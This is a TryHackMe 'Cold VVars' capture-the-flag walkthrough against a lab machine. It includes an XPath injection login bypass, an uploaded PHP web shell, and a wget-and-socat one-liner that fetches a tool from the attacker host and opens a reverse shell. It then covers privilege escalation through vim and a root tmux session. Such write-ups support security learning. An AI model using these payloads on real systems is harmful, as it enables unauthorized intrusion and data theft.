<h1 align="center">Cold VVars</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/fba05e2f-44c8-4c60-899f-4ecec7afd640"><br>
2025, September 4<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>486</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Part of Incognito CTF</em>.<br>
Access it <a href="https://tryhackme.com/room/coldvvars">here</a><br>
<img width="1200px" src="https://github.com/user-attachments/assets/e6a883be-dfaa-41eb-86f8-a583255e06bb"></p>


<h1>Task 1 . Challenge</h1>
<p>Part of Incognito 2.0 CTF<br>

Note- The machine may take about 5 minutes to fully boot.<br>

Like my work, Follow on twitter to be updated and know more about my work! (@0cirius0)</p>

<p><em>Answer the questions below</em></p>

<br>

<h3>nmap</h3>

```bash
:~/ColdVVars# nmap -sC -sV TargetIP
...
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
8080/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8082/tcp open  http        Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
...
Host script results:
|_clock-skew: -1s
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-08-11T17:41:08
|_  start_date: N/A
```

```bash
:~/ColdVVars# nmap -sC -sV -A -p22,445,8080,8082 -T4 xx.xxx.xx.xxx
...
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
445/tcp  open  netbios-ssn Samba smbd 4.6.2
8080/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8082/tcp open  http        Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

<h2>/etc/hosts</h2>

```bash
xx.xxx.xx.xxx    coldvvars.thm
```

<h2>dirb</h2>

```bash
:~/ColdVVars# dirb http://coldvvars.thm:8080
...
---- Scanning URL: http://coldvvars.thm:8080/ ----
==> DIRECTORY: http://coldvvars.thm:8080/dev/                                                                  
+ http://coldvvars.thm:8080/index.html (CODE:200|SIZE:10918)                                                   
+ http://coldvvars.thm:8080/index.php (CODE:200|SIZE:4)                                                        
+ http://coldvvars.thm:8080/server-status (CODE:403|SIZE:280)                                                  
                                                                                                               
---- Entering directory: http://coldvvars.thm:8080/dev/ ----
```

```bash
:~/ColdVVars# dirb http://coldvvars.thm:8082
...                                                    
---- Scanning URL: http://coldvvar.thm:8082/ ----
+ http://coldvvar.thm:8082/login (CODE:200|SIZE:1605)                                                          
+ http://coldvvar.thm:8082/Login (CODE:200|SIZE:1605)                                                          
+ http://coldvvar.thm:8082/static (CODE:301|SIZE:179)
```

<h2>gobuster</h2>

```bash
:~/ColdVVars# gobuster dir -u http://coldvvars.thm:8080/dev/ -w /usr/share/dirb/wordlists/common.txt -x txt,bak,old,html -t 60
...
/note.txt             (Status: 200) [Size: 45]
```

<h2>smbclient</h2>

```bash
:~/ColdVVars# smbclient -L coldvvars.thm -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	SECURED         Disk      Dev
	IPC$            IPC       IPC Service (ip-xx-xxx-xx-xxx server (Samba, Ubuntu))
```

<img width="1236" height="169" alt="image" src="https://github.com/user-attachments/assets/b826c0a3-dfdc-4c06-9953-e30d86c004ba" />

<br>
<h2>Web - coldvvars.thm:8080 and coldvvars.thm:8080/index.html</h2>

<img width="1259" height="285" alt="image" src="https://github.com/user-attachments/assets/93e6d100-21bf-4b94-b29b-87fa791269e2" />

<br>
<h2>Web - coldvvars.thm:8080/index.php</h2>

<img width="1265" height="181" alt="image" src="https://github.com/user-attachments/assets/45087b9d-3498-464e-93a2-53d9cb290681" />

<br>
<h2>Web - coldvvars.thm:8080/dev/</h2>

<img width="1256" height="220" alt="image" src="https://github.com/user-attachments/assets/4924d95a-a3b1-48a7-95be-e611dae9091b" />

<br>
<h2>Web - coldvvars.thm:8080/dev/note.txt</h2>
<p>

- Secure File Upload and Testing Functionality</p>

<img width="1253" height="174" alt="image" src="https://github.com/user-attachments/assets/6cd71b76-f6cd-483f-8a8e-fb8ff2d6ca0f" />

<br>
<h2>Web - coldvvars.thm:8082</h2>

<img width="1254" height="596" alt="image" src="https://github.com/user-attachments/assets/bf008d93-e353-4a4b-93d1-bb1e4cc08950" />

<br>
<h2>Web - coldvvars.thm:8082/login</h2>

<img width="1066" height="561" alt="image" src="https://github.com/user-attachments/assets/ec32beac-3efc-4df7-8916-73d66105f9dd" />

<br>
<h2><code>' OR 1=1</code></h2>
<p

- <code>' OR 1=1</code> = <code>Username or Password Wrong</code><br>
- POST ... <code>username=%27+or+1%3D1&password=&submit=Login</code><br>
- 200 OK ... <code>X-Powered-By</code>: <code>Express</code> ... ETag</p>

<img width="1260" height="333" alt="image" src="https://github.com/user-attachments/assets/516ff623-8e4b-4f4a-bafc-f9a7c5ed7401" />

<br>

<img width="955" height="244" alt="image" src="https://github.com/user-attachments/assets/015d22e3-eece-4496-9ccd-97a0683a33fb" />

<br>
<h2><code>' OR 1=1</code> : <code>password</code></h2>
<p

- <code>' OR 1=1</code> and password--> <code>Username or Password Wrong</code><br>
- POST ... <code>username=%27+or+1%3D1&password=password&submit=Login</code><br>
- 200 OK ... X-Powered-By: Express ... ETag</p>

<br>

<img width="1255" height="370" alt="image" src="https://github.com/user-attachments/assets/cd212a65-5229-41d8-8793-54a7bbc6a131" />

<br>

<p>It´s vulnerable to <code>XPath Injection.</code></p>

<h2><code>admin"or 1=1 or ""="</code></h2>

```bash
Username Password
Tove ****
Godzilla *************
SuperMan ********
ArthurMorgan *******
```

<img width="1276" height="277" alt="image" src="https://github.com/user-attachments/assets/cee1ce23-f489-4ea9-b0fe-6b69115dc9b9" />

<br>

<img width="1270" height="401" alt="image" src="https://github.com/user-attachments/assets/1510253e-a411-4279-af0c-f0be8c57e1a6" />

<br>
<h2>for the same purpose ... to practice</h2>

```bash
POST /login HTTP/1.1
...
username=admin%22or+1%3D1+or+%22%22%3D%22&password=&submit=Login
```

```bash
# curl -X POST -d 'username=admin%22or+1%3D1+or+%22%22%3D%22&password=&submit=Login' 'http://coldvvars.thm:8082/Login'
Username Password<br>Tove             ****<br>Godzilla             *************<br>SuperMan             ********<br>ArthurMorgan             *******<br>
```

<h2>Remote Code Execution</h2>
<p>

- crafted any.txt to test if upload was available<br>
- uploaded it successfully<br>
- created a simple PHP reverse shell rev.php<br>
- uploaded it successfully<br>
- rev.php can be accessed through coldvvars.thm:8080/dev/<br>
- used curl to output the <code>id</code><br>
- used curl to output the current path<br>
- used curl to list the content of /dev<br>
- used curl to list the folders in /home<br>
- used curl to list the content of /home/ArthurMorgan<br>
- identified <code>user.txt</code><br>
- used curl to read <code>user.txt</code></p>

```bash
:~/ColdVVars# echo '<?php system($_GET["cmd"]);?>' > rev.php
```

```bash
:~/ColdVVars# smbclient //coldvvars.thm/SECURED -U ArthurMorgan%*******
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Mar 21 23:04:28 2021
  ..                                  D        0  Thu Mar 11 12:52:29 2021
  note.txt                            N       45  Thu Mar 11 12:19:52 2021

		7708812 blocks of size 1024. 2162536 blocks available
```

```bash
smb: \> put any.txt
putting file any.txt as \any.txt (3.4 kb/s) (average 9.0 kb/s)
smb: \> 
```

```bash
smb: \> put rev.php
putting file rev.php as \rev.php (14.6 kb/s) (average 14.6 kb/s)
```

```bash
:~/ColdVVars# curl http://coldvvars.thm:8080/dev/rev.php --get --data-urlencode "cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
:~/ColdVVars# curl http://coldvvars.thm:8080/dev/rev.php --get --data-urlencode "cmd=pwd"
/var/www/html/dev
```

```bash
:~/ColdVVars# curl http://coldvvars.thm:8080/dev/rev.php --get --data-urlencode "cmd=ls -lah"
total 20K
drwxrwxrwx 2 root         root         4.0K Sep  4 xx:xx.
drwxr-xr-x 3 root         root         4.0K Mar 11  2021 ..
-rwxr--r-- 1 ArthurMorgan ArthurMorgan    7 Sep  4 xx:xx any.txt
-rwxrwxrwx 1 root         root           45 Mar 11  2021 note.txt
-rwxr--r-- 1 ArthurMorgan ArthurMorgan   30 Sep  4 xx:xx rev.php
```

```bash
:~/ColdVVars# curl http://coldvvars.thm:8080/dev/rev.php --get --data-urlencode "cmd=ls -lah /home"
total 24K
drwxr-xr-x  6 root         root         4.0K Sep  4 xx:xx .
drwxr-xr-x 25 root         root         4.0K Sep  4 xx:xx ..
drwxr-xr-x  6 ArthurMorgan ArthurMorgan 4.0K May 28  2021 ArthurMorgan
drwxr-xr-x  8 marston      marston      4.0K May 29  2021 marston
drwxr-xr-x  2 ssm-user     ssm-user     4.0K Jun 29 13:20 ssm-user
drwxr-xr-x  3 ubuntu       ubuntu       4.0K Sep  4 xx:xx ubuntu
```

```bash
:~/ColdVVars# curl http://coldvvars.thm:8080/dev/rev.php --get --data-urlencode "cmd=ls -lah /home/ssm-user"
total 20K
drwxr-xr-x 2 ssm-user ssm-user 4.0K Jun 29 13:20 .
drwxr-xr-x 6 root     root     4.0K Sep  4 xx:xx ..
-rw-r--r-- 1 ssm-user ssm-user  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 ssm-user ssm-user 3.7K Apr  4  2018 .bashrc
-rw-r--r-- 1 ssm-user ssm-user  807 Apr  4  2018 .profile
```

```bash
:~/ColdVVars# curl http://coldvvars.thm:8080/dev/rev.php --get --data-urlencode "cmd=ls -lah /home/ArthurMorgan"
total 32K
drwxr-xr-x 6 ArthurMorgan ArthurMorgan 4.0K May 28  2021 .
drwxr-xr-x 6 root         root         4.0K Sep  4 xx:xx ..
lrwxrwxrwx 1 root         root            9 Mar 23  2021 .bash_history -> /dev/null
drwx------ 2 ArthurMorgan ArthurMorgan 4.0K Mar 21  2021 .cache
drwxr-x--- 3 ArthurMorgan ArthurMorgan 4.0K Mar 21  2021 .config
drwx------ 4 ArthurMorgan ArthurMorgan 4.0K Mar 21  2021 .gnupg
drwxrwxr-x 3 ArthurMorgan ArthurMorgan 4.0K Mar 21  2021 .local
-rw-r--r-- 1 ArthurMorgan ArthurMorgan   56 Mar 21  2021 ideas
-rw-r--r-- 1 ArthurMorgan ArthurMorgan   33 Mar 21  2021 user.txt
```

```bash
:~/ColdVVars# curl http://coldvvars.thm:8080/dev/rev.php --get --data-urlencode "cmd=cat /home/ArthurMorgan/user.txt"
********************************
```

<br>
<p>User.txt<br>
<code>********************************</code></p>

<h2>Reverse Shell</h2>
<p>

- set up a http server<br>
- set up a listener<br>
- uploaded socat, made it executable, and used it to open a reverse shell that connects back to attack virtual machine</p>

```bash
:~/ColdVVars# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
:~/ColdVVars# nc -nlvp 9001
Listening on 0.0.0.0 9001
```

```bash
:~/ColdVVars# curl http://coldvvars.thm:8080/dev/rev.php --get --data-urlencode "cmd=wget http://xx.xxx.xx.x:8000/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:xx.xxx.xx.x:9001 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"
```

```bash
:~/ColdVVars# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xxx.x.xxx - - [04/Sep/2025 xx:xx:xx] "GET /socat HTTP/1.1" 200 -
```

<h4>Stabilize Shell</h4>

```bash
:~/ColdVVars# nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on xx.xxx.x.xxx6 48266
www-data@...:/var/www/html/dev$
```

```bash
www-data@...:/var/www/html/dev$ which python3
which python3
/usr/bin/python3
```

```bash
www-data@...:/var/www/html/dev$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<dev$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
www-data@...:/var/www/html/dev$ ^Z
[1]+  Stopped                 nc -nlvp 9001
```

```bash
:~/ColdVVars# stty raw -echo; fg
...
nc -nlvp 9001
```

```bash
www-data@...:/var/www/html/dev$ export TERM=xterm-256color
export TERM=xterm-256color
```

<br>

```bash
www-data@...:/var/www/html/dev$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
www-data@...:/var/www/html/dev$ cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
root:x:0:0:root:/root:/bin/bash
ArthurMorgan:x:1001:1002::/home/ArthurMorgan:/bin/sh
marston:x:1002:1003::/home/marston:/bin/bash
ssm-user:x:1003:1004::/home/ssm-user:/bin/sh
ubuntu:x:1004:1006:Ubuntu:/home/ubuntu:/bin/bash
```

<h2>ArthurMorgan</h2>

```bash
www-data@...:/var/www/html/dev$ su ArthurMorgan                        
su ArthurMorgan
Password: *******

$ /bin/bash
/bin/bash
ArthurMorgan@...:/var/www/html/dev$ id
id
uid=1001(ArthurMorgan) gid=1002(ArthurMorgan) groups=1002(ArthurMorgan),1001(smbgrp)
```

```bash
ArthurMorgan@...:/home$ cd ArthurMorgan
cd ArthurMorgan
ArthurMorgan@...:~$ ls -lah
ls -lah
total 32K
drwxr-xr-x 6 ArthurMorgan ArthurMorgan 4.0K May 28  2021 .
drwxr-xr-x 6 root         root         4.0K Sep  4 20:22 ..
lrwxrwxrwx 1 root         root            9 Mar 23  2021 .bash_history -> /dev/null
drwx------ 2 ArthurMorgan ArthurMorgan 4.0K Mar 21  2021 .cache
drwxr-x--- 3 ArthurMorgan ArthurMorgan 4.0K Mar 21  2021 .config
drwx------ 4 ArthurMorgan ArthurMorgan 4.0K Mar 21  2021 .gnupg
-rw-r--r-- 1 ArthurMorgan ArthurMorgan   56 Mar 21  2021 ideas
drwxrwxr-x 3 ArthurMorgan ArthurMorgan 4.0K Mar 21  2021 .local
-rw-r--r-- 1 ArthurMorgan ArthurMorgan   33 Mar 21  2021 user.txt
```

```bash
ArthurMorgan@...:~$ cat ideas
cat ideas
I don't know why I don't get any ideas to write here...
```

```bash
ArthurMorgan@ip-xx-xxx-xx-xxx:~$ sudo -l
[sudo] password for ArthurMorgan: 
Sorry, user ArthurMorgan may not run sudo on ip-xx-xxx-xx-xxx.
```

```bash
ArthurMorgan@...:~$ find / -perm -4000 -user root -type f 2>/dev/null
...
/snap/core20/2501/usr/bin/passwd
/snap/core20/2501/usr/bin/su
/snap/core20/2501/usr/bin/sudo
/snap/core20/2501/usr/bin/umount
/snap/core20/2501/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2501/usr/lib/openssh/ssh-keysign
/bin/su
/bin/fusermount
/bin/umount
/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/sbin/mount.cifs
```

<h4>pspy</h4>

```bash
ArthurMorgan@...:~$ wget http://xx.xxx.xx.x:8000/pspy64 -O /tmp/pspy;chmod +x /tmp/pspy;/tmp/pspy
wget http://xx.xxx.xx.x:8000/pspy64 -O /tmp/pspy;chmod +x /tmp/pspy;/tmp/pspy
...
/tmp/pspy           100%[===================>]   2.94M  --.-KB/s    in 0.02s   
...
2025/09/04 xx:xx:xx CMD: UID=1002 PID=920    | tmux new-session -d 
...
2025/09/04 xx:xx:xx CMD: UID=33   PID=880    | /usr/sbin/apache2 -k start
2025/09/04 xx:xx:xx CMD: UID=33   PID=879    | /usr/sbin/apache2 -k start 
2025/09/04 xx:xx:xx CMD: UID=33   PID=878    | /usr/sbin/apache2 -k start 
2025/09/04 xx:xx:xx CMD: UID=1002 PID=877    | /lib/systemd/systemd --user 
2025/09/04 xx:xx:xx CMD: UID=33   PID=876    | /usr/sbin/apache2 -k start 
2025/09/04 xx:xx:xx CMD: UID=33   PID=875    | /usr/sbin/apache2 -k start 
2025/09/04 xx:xx:xx CMD: UID=0    PID=872    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal 
...
2025/09/04 xx:xx:xx CMD: UID=0    PID=859    | /usr/sbin/apache2 -k start 
...
2025/09/04 xx:xx:xx CMD: UID=0    PID=718    | /usr/sbin/cron -f 
...
2025/09/04 xx:xx:xx CMD: UID=1002 PID=4761   | python3 /home/marston/hicckup.py 
...
2025/09/04 xx:xx:xx CMD: UID=1002 PID=1276   | python3 /home/marston/hicckup.py 
...
2025/09/04 xx:xx:xx CMD: UID=0    PID=5273   | /usr/sbin/CRON -f 
2025/09/04 xx:xx:xx CMD: UID=1002 PID=5276   | /bin/sh -c /home/marston/run.sh 
2025/09/04 xx:xx:xx CMD: UID=1002 PID=5274   | /bin/sh -c /home/marston/run.sh 
...
2025/09/04 xx:xx:xx CMD: UID=1002 PID=5279   | grep python3 /home/marston/hicckup.py 
...
2025/09/04 xx:xx:xx CMD: UID=0    PID=5287   | /usr/sbin/CRON -f 
2025/09/04 xx:xx:xx CMD: UID=0    PID=5288   | /usr/sbin/CRON -f 
...
```

<h4>linpeas.sh</h4>

<img width="912" height="625" alt="image" src="https://github.com/user-attachments/assets/e45e65dc-3bdc-48ad-9d19-e191def25de5" />

<img width="853" height="636" alt="image" src="https://github.com/user-attachments/assets/e9d60e7d-e59f-4105-9e59-77fb5f9b6317" />

<img width="967" height="611" alt="image" src="https://github.com/user-attachments/assets/db482cca-b350-48b1-aabf-a25ed9ade5fa" />

<img width="921" height="278" alt="image" src="https://github.com/user-attachments/assets/69027807-f6e8-4fdf-810f-f665c8742dcf" />

<img width="934" height="596" alt="image" src="https://github.com/user-attachments/assets/d9ef9e33-6581-49ba-9612-fb2072897c40" />

<img width="810" height="170" alt="image" src="https://github.com/user-attachments/assets/80692a95-2125-483b-bc50-1ed0339057a9" />


<br>
<br>

```bash
ArthurMorgan@...:~$ env            
SHELL=/bin/sh
PWD=/home/ArthurMorgan
LOGNAME=ArthurMorgan
OPEN_PORT=4545
XDG_SESSION_TYPE=tty
...
```

```bash
ArthurMorgan@...:~$ nc -nvlp 4545
Listening on 0.0.0.0 4545
Connection received on 127.0.0.1 36014


ideaBox
1.Write
2.Delete
3.Steal others' Trash
4.Show'nExit
```

```bash
4
```

<h4>vim</h4>

```bash
:!/bin/sh
```

<p>
	
- ENTER</p>


<h2>marston</h2>

```bash
whoami
marston
```

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
marston@...:~$ export TERM=xterm-256color
export TERM=xterm-256color
```

<h4>tmux</h4>

```bash
marston@...:~$ ps aux | grep tmux
ps aux | grep tmux
marston      896  0.0  0.1   7900  4024 ?        Ss   xx:xx   0:00 tmux new-session -d
marston     1753  0.0  0.0   6440   660 pts/21   S+   xx:xx  0:00 grep --color=auto tmux
```

```bash
marston@...:~$ tmux ls
tmux ls
0: 9 windows (created Thu Sep  4 xx:xx:xx 2025)
```

```bash
marston@...:~$ tmux attach-session -t 0
```

<p>
	
- exit</p>

<img width="580" height="417" alt="image" src="https://github.com/user-attachments/assets/0833bae2-907b-4ffc-a107-20bfcbc37425" />

<p>
	
- exit</p>

<img width="581" height="416" alt="image" src="https://github.com/user-attachments/assets/54740f38-8cdd-42cd-8426-f450dacd3e3f" />

<p>
	
- exit</p>

<img width="582" height="414" alt="image" src="https://github.com/user-attachments/assets/b601ef72-aea3-4a71-ba4d-2f33619a36a3" />

<p>
	
- exit</p>

<img width="581" height="416" alt="image" src="https://github.com/user-attachments/assets/a6ab0cac-bda8-4ac0-9307-d04fb39d88f4" />

<p>
	
- exit</p>

<img width="578" height="416" alt="image" src="https://github.com/user-attachments/assets/67e85638-474e-4650-8e69-34af33d6e4ed" />

<p>
	
- exit</p>

<img width="581" height="416" alt="image" src="https://github.com/user-attachments/assets/34ebdbcd-310e-4c34-bb7a-81cd0cdda38d" />

<p>
	
- exit</p>

<img width="581" height="415" alt="image" src="https://github.com/user-attachments/assets/1af22d6c-fda8-4187-a407-bdac8ec95d9c" />

<p>
	
- exit .... exit   ...</p>

<img width="580" height="415" alt="image" src="https://github.com/user-attachments/assets/537508f7-ee32-4f6e-a478-e27188511d43" />


```bash
root@...:~$ cd /root
cd /root
```

```bash
root@...:~$ ls
ls
root.txt
```

<p>1.2. Root.txt<br>
<code>********************************</code></p>

<br>
<br>


<img width="1902" height="902" alt="image" src="https://github.com/user-attachments/assets/53ec1079-bcd4-4b40-974a-6ef7c1d36b8b" />

<img width="1908" height="894" alt="image" src="https://github.com/user-attachments/assets/5ac31bbe-41dd-41fc-b885-f4ef5f4e32f9" />








